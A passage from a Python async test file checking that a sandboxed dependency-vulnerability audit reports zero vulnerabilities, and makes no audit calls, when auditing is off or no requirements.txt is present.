        doc_coverage_fn=lambda ws: 1.0,
    )
    absent = await _measure_with_audit(tmp_path, sandbox)  # pas de requirements.txt : rien à auditer
    assert off.dep_vulns == 0 and off.dep_audit_measured
    assert absent.dep_vulns == 0 and absent.dep_audit_measured
    assert sandbox.audit_calls == []
